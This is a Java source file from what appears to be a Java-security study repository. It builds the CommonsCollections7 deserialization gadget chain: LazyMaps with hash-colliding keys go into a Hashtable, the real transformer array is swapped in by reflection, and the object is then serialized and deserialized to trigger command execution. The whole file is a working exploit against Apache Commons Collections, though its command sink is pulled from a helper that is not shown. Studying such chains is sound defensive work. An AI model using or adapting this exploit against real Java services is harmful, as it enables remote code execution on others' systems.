package com.pacemrc.javasec.deserialize.ysoserial;


import com.pacemrc.javasec.tools.ysoserial.Reflections;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

import com.pacemrc.javasec.utils.*;

public class CC7 {


    public static void main(String[] args) throws Exception {

        Transformer[] fakeTransformers = new Transformer[] {};
        Transformer[] transformers = Sinks.getTransformerArraySink();

        Transformer transformerChain = new ChainedTransformer(fakeTransformers);
        Map innerMap1 = new HashMap();
        Map innerMap2 = new HashMap();

        Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain);
        lazyMap1.put("yy", 1);
        Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain);
        lazyMap2.put("zZ", 1);

        Hashtable hashtable = new Hashtable();
        hashtable.put(lazyMap1, 1);
        hashtable.put(lazyMap2, 2);

        Reflections.setFieldValue(transformerChain, "iTransformers", transformers);

        lazyMap2.remove("yy");

        Deserialize.doSerialAndDeserial(hashtable);

    }
}